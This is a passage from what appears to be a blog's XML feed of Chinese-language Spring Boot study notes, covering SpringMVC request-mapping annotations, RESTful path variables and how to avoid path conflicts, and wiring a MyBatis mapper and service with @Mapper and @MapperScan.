class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> StudentService studentService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/put&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span></span><br><span class="line">    Object <span class="title function_">put</span><span class="params">(String key, String value)</span> &#123;</span><br><span class="line"></span><br><span class="line">        studentService.put(key, value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;值已成功放入redis&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/get&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span></span><br><span class="line">    String <span class="title function_">get</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">count</span> <span class="operator">=</span> studentService.get(<span class="string">&quot;count&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;数据count为:&quot;</span> + count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
          <category> SpringBoot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 后端 </tag>
            
            <tag> Spring </tag>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 学习笔记 07</title>
      <link href="/2021/08/10/57f701012393-q1jun/"/>
      <url>/2021/08/10/57f701012393-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Boot学习笔记-07"><a href="#Spring-Boot学习笔记-07" class="headerlink" title="Spring Boot学习笔记 07"></a>Spring Boot学习笔记 07</h1><h2 id="0x01-SpringMVC-常用注解"><a href="#0x01-SpringMVC-常用注解" class="headerlink" title="0x01 SpringMVC 常用注解"></a>0x01 SpringMVC 常用注解</h2><p><strong>@GetMapping</strong>等价于<em>单独使用Get方法</em>的**@RequestMapping**，比如下面代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/queryStudentById2&quot;,method = RequestMethod.GET)</span></span><br><span class="line"><span class="comment">//该注解通过在查询数据的时候使用 -&gt; 查询</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">queryStudentById2</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Ony GET Method&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以写成：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(value = &quot;/queryStudentById2&quot;)</span> <span class="comment">//相当于上一句话,只接收GET请求,如果请求方式不对会报405错误</span></span><br><span class="line">   <span class="comment">//该注解通过在查询数据的时候使用 -&gt; 查询</span></span><br><span class="line">   <span class="keyword">public</span> Object <span class="title function_">queryStudentById2</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;Ony GET Method&quot;</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>相当于上一句话,只接收GET请求,如果请求方式不对会报405错误。</p><p>同理的还有**@PostMapping**，比如下面的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/insert&quot;,method = RequestMethod.POST)</span></span><br><span class="line"><span class="comment">//该注解通常在新增数据的时候使用 -&gt; 新增</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">insert</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Insert success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>则可以写成：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(value = &quot;/insert&quot;)</span> </span><br><span class="line">   <span class="comment">//该注解通常在新增数据的时候使用 -&gt; 新增</span></span><br><span class="line">   <span class="keyword">public</span> Object <span class="title function_">insert</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;Insert success&quot;</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>除此之外还有**@DeleteMapping** ,<strong>@PutMapping</strong>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//    @RequestMapping(value = &quot;/delete&quot;,method = RequestMethod.DELETE)</span></span><br><span class="line"><span class="meta">@DeleteMapping(value = &quot;/delete&quot;)</span><span class="comment">//相当于上一句话</span></span><br><span class="line"><span class="comment">//该注解通常在删除数据的时候使用 -&gt; 删除</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">delete</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;delete Student&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//    @RequestMapping(value = &quot;/update&quot;,method = RequestMethod.PUT)</span></span><br><span class="line"><span class="meta">@PutMapping(value = &quot;/update&quot;)</span> <span class="comment">//相当于上一句话</span></span><br><span class="line"><span class="comment">//该注解通常在修改数据的时候使用 -&gt; 更新</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">update</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;update student info1&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样极大的简化了我们的代码。</p><h2 id="0x02-RESTFul"><a href="#0x02-RESTFul" class="headerlink" title="0x02 RESTFul"></a>0x02 RESTFul</h2><p><strong>REST</strong>（英文：<em>Representational State Transfer</em>，简称 REST） 一种互联网软件架构设计的风格，但它并不是标准，它只是提出了一组客户端和服务器 交互时的架构理念和设计原则，基于这种理念和原则设计的接口可以更简洁，更有层次，REST 这个词，是 Roy Thomas Fielding 在他 2000 年的博士论文中提出的。 任何的技术都可以实现这种理念，如果一个架构符合 REST 原则，就称它为 <strong>RESTFul 架 构</strong></p><p>Spring boot 开发 RESTFul 主要是几个注解实现<br>（1） @PathVariable ：获取 url 中的数据 ，该注解是实现 RESTFul 最主要的一个注解<br>（2） @PostMapping ：接收和处理 Post 方式的请求<br>（3） @DeleteMapping ：接收 delete 方式的请求，可以使用 GetMapping 代替<br>（4） @PutMapping ：接收 put 方式的请求，可以用 PostMapping 代替<br>（5） @GetMapping ：接收 get 方式的请求</p><p>RESTFul风格的代码好处有：<br>➢ 传递参数变简单了<br>➢ 服务提供者对外只提供了一个接口服务，而不是传统的 CRUD 四个接口</p><p>下面我们看代码，来实现RESTFul：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//    @RequestMapping(value = &quot;/student/detail/&#123;id&#125;/&#123;age&#125;&quot;)</span></span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/student/detail/&#123;id&#125;/&#123;age&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">student1</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id,</span></span><br><span class="line"><span class="params">                           <span class="meta">@PathVariable(&quot;age&quot;)</span> Integer age)</span> &#123;</span><br><span class="line">        Map&lt;String,Object&gt; retMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        retMap.put(<span class="string">&quot;id&quot;</span>,id);</span><br><span class="line">        retMap.put(<span class="string">&quot;age&quot;</span>,age);</span><br><span class="line">        <span class="keyword">return</span> retMap;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们在路径里面添加了**{id}<strong>和</strong>{age}<strong>这两个变量，然后在下方通过注释</strong>@PathVariable<strong>来调用参数在路径中获取的值，传给变量id和age，然后就能在方法中使用所获取的值了。<br>这样我们在浏览器输入</strong><a target="_blank" rel="noopener" href="http://localhost:8080/student/0101/28">http://localhost:8080/student/0101/28</a> **<br>就能把<strong>0101</strong> 和 <strong>28</strong>这两个值传入方法中进行调用。</p><p>和之前的写法进行对比：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/student&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">student</span><span class="params">(Integer id,Integer age)</span> &#123;</span><br><span class="line">    <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">    student.setId(id);</span><br><span class="line">    student.setAge(age);</span><br><span class="line">    <span class="keyword">return</span> student;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过这种方法的url写法为**<a target="_blank" rel="noopener" href="http://localhost:8080/student?id=0101&amp;age=28">http://localhost:8080/student?id=0101&amp;age=28</a>  **<br>显然前者更具有观赏性和实用性（而且更安全）。</p><p>但是这种方式也会出现冲突，因为在路径的填写时，并不能知道哪个是id哪个是age，所以我们在设计的时候，通常在RESTful风格中方法的请求方式会按<strong>增删改查</strong>的请求方式来区分，比如如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/student/detail/&#123;id&#125;/&#123;age&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">student1</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id,</span></span><br><span class="line"><span class="params">                       <span class="meta">@PathVariable(&quot;age&quot;)</span> Integer age)</span> &#123;</span><br><span class="line">    Map&lt;String,Object&gt; retMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    retMap.put(<span class="string">&quot;id&quot;</span>,id);</span><br><span class="line">    retMap.put(<span class="string">&quot;age&quot;</span>,age);</span><br><span class="line">    <span class="keyword">return</span> retMap;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/student/detail/&#123;id&#125;/&#123;status&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">student2</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id,</span></span><br><span class="line"><span class="params">                       <span class="meta">@PathVariable(&quot;status&quot;)</span> Integer status)</span> &#123;</span><br><span class="line">    Map&lt;String,Object&gt; retMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    retMap.put(<span class="string">&quot;id&quot;</span>,id);</span><br><span class="line">    retMap.put(<span class="string">&quot;status&quot;</span>,status);</span><br><span class="line">    <span class="keyword">return</span> retMap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Student1和Student2方法调用路径时会报错，原因是发生冲突，因为路径传进来的时候无法区分最后是{age}还是{status}，那怎么办呢？</p><p><strong>方法一：</strong><br>我们只需要在设计的时候避免这种情况发生，比如可以改成如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/student/&#123;id&#125;/detail/&#123;city&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">student3</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id,</span></span><br><span class="line"><span class="params">                       <span class="meta">@PathVariable(&quot;city&quot;)</span> Integer city)</span> &#123;</span><br><span class="line">    Map&lt;String,Object&gt; retMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    retMap.put(<span class="string">&quot;id&quot;</span>,id);</span><br><span class="line">    retMap.put(<span class="string">&quot;city&quot;</span>,city);</span><br><span class="line">    <span class="keyword">return</span> retMap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就能避免两种方法调用的路径相同而发生冲突了！</p><p><strong>方法二：</strong><br>还有一种方法就是通过改变注释来避免相同注释的冲突：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//    @RequestMapping(value = &quot;/student/detail/&#123;id&#125;/&#123;age&#125;&quot;)</span></span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/student/detail/&#123;id&#125;/&#123;age&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">student1</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id,</span></span><br><span class="line"><span class="params">                           <span class="meta">@PathVariable(&quot;age&quot;)</span> Integer age)</span> &#123;</span><br><span class="line">        Map&lt;String,Object&gt; retMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        retMap.put(<span class="string">&quot;id&quot;</span>,id);</span><br><span class="line">        retMap.put(<span class="string">&quot;age&quot;</span>,age);</span><br><span class="line">        <span class="keyword">return</span> retMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    @RequestMapping(value = &quot;/student/detail/&#123;id&#125;/&#123;status&#125;&quot;)</span></span><br><span class="line">    <span class="meta">@DeleteMapping(value = &quot;/student/detail/&#123;id&#125;/&#123;status&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">student2</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id,</span></span><br><span class="line"><span class="params">                           <span class="meta">@PathVariable(&quot;status&quot;)</span> Integer status)</span> &#123;</span><br><span class="line">        Map&lt;String,Object&gt; retMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        retMap.put(<span class="string">&quot;id&quot;</span>,id);</span><br><span class="line">        retMap.put(<span class="string">&quot;status&quot;</span>,status);</span><br><span class="line">        <span class="keyword">return</span> retMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从代码中我们发现，虽然路径是一样的，但是注释不一样，把原来的@RequestMapping换成了@GetMapping和@DeleteMapping，所以当路径一样时，Get方法和Delete方法所请求的路径是不一样的，这样也能避免冲突，但是相比于方法一还是不够好。</p>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
          <category> SpringBoot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 后端 </tag>
            
            <tag> Spring </tag>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 学习笔记 06</title>
      <link href="/2021/08/09/893e8b53eb77-q1jun/"/>
      <url>/2021/08/09/893e8b53eb77-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Boot-学习笔记-06"><a href="#Spring-Boot-学习笔记-06" class="headerlink" title="Spring Boot 学习笔记 06"></a>Spring Boot 学习笔记 06</h1><h2 id="0x01-Mybatis服务接口及调用"><a href="#0x01-Mybatis服务接口及调用" class="headerlink" title="0x01 Mybatis服务接口及调用"></a>0x01 Mybatis服务接口及调用</h2><p>在我们已经通过逆向生成了Mapper接口类、映射文件以及JAVA模型的之后，我们还需要通过业务层的服务来调用数据。</p><p>我们首先在控制层@Controller注解的方法下添加@Autowired注解来注入业务层提取的数据：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> StudentService studentService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/student&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> Object <span class="title function_">student</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> studentService.queryStudentById(id);</span><br><span class="line">        <span class="keyword">return</span> student;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且在下方的@RequestMapping注解中调用该服务注入的数据存放到Student类中。</p><p>这时候肯定还是不够的，因为我们在这里创建了一个叫做StudentService的类，那我们就在Application.java同级目录或下级目录中创建这个服务类和接口。<br>在Application.java同级目录新增一个包，包名为service，包内新建一个接口类，接口名为StudentService:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bjpowernode.springboot.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.bjpowernode.springboot.model.Student;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">StudentService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据学生ID查询详情</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Student <span class="title function_">queryStudentById</span><span class="params">(Integer id)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>该接口的功能为根据学生ID查询学生详情数据。</p><p>对应这个接口，我们还需要一个实现类，我们在这个接口同级目录下新建一个包，包名为Impl，包内新建java文件StudentServiceImpl.java来实现接口的功能。</p><p>而且我们的业务接口实现类还得通过__@Service__注解放入Spring容器中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bjpowernode.springboot.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.bjpowernode.springboot.mapper.StudentMapper;</span><br><span class="line"><span class="keyword">import</span> com.bjpowernode.springboot.model.Student;</span><br><span class="line"><span class="keyword">import</span> com.bjpowernode.springboot.service.StudentService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">StudentService</span> &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这个业务层，需要调用数据持久层，就通过@Autowired这个注解注入进来,这里我们就将StudentMapper注入进来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> StudentMapper studentMapper;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那我们注入的studentMapper就要给我们提供一个方法，那就是通过之前Mybatis逆向生成的selectByPrimaryKey()方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Student <span class="title function_">queryStudentById</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> studentMapper.selectByPrimaryKey(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里还不够，我们还必须添加一个扫描器，来扫描DAO接口到Spring容器，我们才能在<strong>业务接口实现类</strong>中实现studentMapper的注入：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bjpowernode.springboot.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.bjpowernode.springboot.model.Student;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Mapper;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Mapper</span> <span class="comment">//扫描DAO接口到spring容器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">StudentMapper</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">deleteByPrimaryKey</span><span class="params">(Integer id)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">insert</span><span class="params">(Student record)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">insertSelective</span><span class="params">(Student record)</span>;</span><br><span class="line"></span><br><span class="line">    Student <span class="title function_">selectByPrimaryKey</span><span class="params">(Integer id)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">updateByPrimaryKeySelective</span><span class="params">(Student record)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">updateByPrimaryKey</span><span class="params">(Student record)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是现在还有一个问题，那就是xml文件在src里面是不能被项目编译执行的，所以我们必须在pom.xml中的<build>添加resources项来让项目编译xml文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--手动指定文件夹为resources--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样当我们在浏览器输入<a target="_blank" rel="noopener" href="http://localhost:8080/student?id=1%E6%97%B6%EF%BC%8C%E6%88%91%E4%BB%AC%E5%B0%B1%E8%83%BD%E8%8E%B7%E5%BE%97id=1%E7%9A%84%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E4%BA%86%E3%80%82">http://localhost:8080/student?id=1时，我们就能获得id=1的学生信息了。</a></p><p>数据库中的表的信息如下：<br>id,name,age<br>1,zhangsan,25<br>2,lisi,28<br>3,wangwu,23<br>4,Tom,21<br>5,Jck,55<br>6,Lucy,27<br>7,zhaoliu,75</p><p>浏览器返回{“id”:1,”name”:”zhangsan”,”age”:25}</p><p>说明我们配置成功！</p><h2 id="0x02-Mybatis扫描多个Mapper接口及子目录"><a href="#0x02-Mybatis扫描多个Mapper接口及子目录" class="headerlink" title="0x02 Mybatis扫描多个Mapper接口及子目录"></a>0x02 Mybatis扫描多个Mapper接口及子目录</h2><p>在上面我们说到了扫描器**@Mapper<strong>，但是如果我们有多个Mapper接口类和映射文件呢？这里我们就不再使用</strong>@Mapper**这个单一扫描器了。</p><p>我们在Application.java这个入口类的**@SpringBootApplication<strong>注释旁添加一个注释:</strong>@MapperScan(“”)** ，来开启扫描Mapper接口的包以及子目录：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bjpowernode.springboot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.mybatis.spring.annotation.MapperScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span>  <span class="comment">//开启spring配置</span></span><br><span class="line"><span class="meta">@MapperScan(&quot;com.bjpowernode.springboot.mapper&quot;)</span> <span class="comment">//开启扫描Mapper接口的包以及子目录</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样我们就不用再额外添加**@Mapper<strong>这个注释了！</strong>(“”)** 内写的是Mapper接口的包所在路径。</p>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
          <category> SpringBoot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 后端 </tag>
            
            <tag> Spring </tag>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
